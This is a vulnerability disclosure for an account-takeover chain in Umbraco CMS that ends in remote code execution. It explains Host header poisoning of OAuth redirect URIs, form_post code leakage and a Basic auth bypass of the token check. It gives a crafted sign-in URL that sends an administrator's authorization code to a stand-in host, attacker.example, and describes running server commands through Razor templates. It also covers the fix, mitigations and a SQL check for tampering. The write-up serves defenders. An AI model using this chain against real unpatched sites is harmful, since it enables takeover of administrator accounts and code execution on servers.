---
title: "Umbraco Back-Office Account Takeover"
vendor: "Umbraco"
product: "Umbraco CMS"
class: "Account takeover (Host header poisoning, OAuth redirect)"
severity: "High"
status: "Disclosed"
date: 2026-10-27
cve: "CVE-2026-117553"
link: "https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-rpv9-qp4c-g469"
summary: "Back-office account takeover leading to remote code execution. A poisoned Host header adds an attacker's domain to the back-office OAuth redirect list. One click on a crafted sign-in link sends a signed-in admin's raw authorization code there, and a Basic auth header gets it past the token endpoint check. Fixed in 17.7.2 and 18.2.2."
---

## Overview

Umbraco CMS signs back-office users in through OpenIddict, an OAuth 2.0 and OpenID Connect server for ASP.NET Core. The back-office is a public OAuth client, `umbraco-back-office`, with no client secret.

Three weaknesses chain into a stolen administrator session:

1. An unauthenticated request with a forged `Host` header permanently adds the attacker's domain to the back-office redirect list.
2. With `response_mode=form_post`, the authorization code goes out unredacted.
3. Sending the client ID in an HTTP Basic auth header skips the token endpoint's check for raw codes.

The attack needs one click from a signed-in administrator. After that, the attacker can run code on the server through Razor templates.

We tested a default Umbraco 18.2.0 install (`dotnet new umbraco`, .NET 10, SQLite, Windows). We confirmed each step against the running server and against the source at the `release-18.2.0` tag. Versions earlier than 17.7.2, and 18.x versions earlier than 18.2.2, are affected. The full chain applies wherever requests for unrecognized host names reach Umbraco: Kestrel serving directly, IIS without host name bindings, or a reverse proxy that forwards the `Host` header unchanged. The default template doesn't set `AllowedHosts`.

## Host header poisons the redirect list

`BackOfficeAuthorizationInitializationMiddleware` runs on back-office requests. It builds an origin from the request and, when that origin is new, registers it with the back-office OAuth application:

```csharp
var host = $"{context.Request.Scheme}://{context.Request.Host}";
if (_knownHosts.Contains(host))
{
    return;
}

// ...
var hostsToRegister = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { host };

// ...
await backOfficeApplicationManager.EnsureBackOfficeApplicationAsync(backOfficeHosts);
```

`context.Request.Host` comes from the `Host` header. There's no authentication check and no host allowlist. In 18.2.0, the middleware builds the origin at line 74 and saves it at line 112. `BackOfficeApplicationManager.cs` (line 293) then adds the attacker's callback as an allowed redirect URI.

One unauthenticated request to a back-office path with `Host: attacker.example` is enough. The registration persists in the `umbracoOpenIddictApplications` table, and it needs no account and no victim.

## form_post leaks the raw code

After sign-in, Umbraco normally redacts the authorization code. `HideBackOfficeTokensHandler` (lines 110–129) replaces it with `[redacted]` in the response and keeps the real code in a cookie. `UmbracoBuilderAuthExtensions.cs` (lines 136–141) orders that step for the `query` response only, so `response_mode=form_post` skips it.

The attacker sends a signed-in administrator a sign-in link that points at the real site but sets `redirect_uri` to the attacker's domain:

```text
https://TARGET/umbraco/management/api/v1/security/back-office/authorize
  ?client_id=umbraco-back-office
  &response_type=code
  &response_mode=form_post
  &redirect_uri=https%3A%2F%2Fattacker.example%2Fumbraco%2Foauth_complete
  &scope=openid
  &code_challenge=<attacker PKCE challenge>
  &code_challenge_method=S256
  &state=xyz
```

OpenIddict accepts the redirect URI because the poisoned host is registered. Sign-in completes silently. Umbraco returns an auto-submitting form that posts the real code to the attacker's domain. On the live server, `form_post` returned the real code, while the default `query` mode returned `[redacted]`.

The attacker supplies the PKCE challenge, so they hold the matching verifier.

## Basic auth bypasses the token endpoint check

At the token endpoint, `HideBackOfficeTokensHandler` (lines 132–175) rejects raw codes for the back-office client. It only runs that check when it can see the client ID. When the client ID isn't set yet, it returns early, and the clear at line 158 never runs.

`UmbracoBuilderAuthExtensions.cs` (lines 142–147) ordered this check after OpenIddict read the form body but before it read HTTP Basic credentials. The attacker leaves `client_id` out of the form body and sends `umbraco-back-office:` as a Basic auth header instead. The check sees no client ID and skips itself. OpenIddict then reads the client ID from the header and completes the exchange.

On the live server, a request with `client_id` in the body got a `400`. The same request with the client ID in a Basic auth header returned a valid administrator token.

## Code execution through Razor templates

With an administrator session, the attacker can do anything the administrator can through the Management API. Umbraco templates are Razor, which is C#. In the default `BackofficeDevelopment` runtime mode, Umbraco compiles and runs templates when a page is requested.

The attacker creates a template containing C#, publishes a page that uses it, and loads the page. We confirmed this end to end. An anonymous page load returned the result of `5*5`, the contents of a file read from disk, and the output of `whoami` on the server.

## Fix

Umbraco CMS 17.7.2 and 18.2.2 include the fix, from commit [`490b9b2`](https://github.com/umbraco/Umbraco-CMS/commit/490b9b27dcbb8fb3fe868a36203590968b0569d6). The commit makes the following changes:

- It adds `BackOfficeRedirectUriValidationHandler`. This handler accepts a back-office redirect URI only when it's on the host serving the request or on an explicitly configured host. The check also applies to post-logout redirects. Redirect URIs stored before the upgrade are ignored.
- It rejects any `response_mode` other than `query` for the back-office client.
- It moves the raw-code check after HTTP Basic credential extraction, so the client ID is known wherever it was sent.

```csharp
if (clientId is Constants.OAuthClientIds.BackOffice
    && context.Request.ResponseMode.IsNullOrWhiteSpace() is false
    && context.Request.ResponseMode is not OpenIddictConstants.ResponseModes.Query)
{
    context.Reject(
        error: OpenIddictConstants.Errors.InvalidRequest,
        description: "The specified 'response_mode' is not supported.");
}
```

If you can't upgrade yet, set `AllowedHosts` in `appsettings.json` to the site's own host names, or bind the web server or proxy to explicit host names. To check for tampering, look for unfamiliar hosts in the stored redirect URIs:

```sql
SELECT ClientId, RedirectUris, PostLogoutRedirectUris
FROM umbracoOpenIddictApplications
WHERE ClientId IN ('umbraco-back-office', 'umbraco-swagger')
```

## Disclosure

- **2026-10-05:** Project Umbra reported the issues to Umbraco.
- **2026-10-27:** Umbraco released 17.7.2 and 18.2.2 and published [GHSA-rpv9-qp4c-g469](https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-rpv9-qp4c-g469).
- **2026-10-27:** VulnCheck assigned CVE-2026-117553 (CVSS 4.0: 7.7, CVSS 3.1: 7.5).

The CVE record credits Eu Joe Chegne and Damien Wong of Project Umbra as finders. Our own assessment rates the full chain Critical, because it ends in remote code execution after one administrator click.
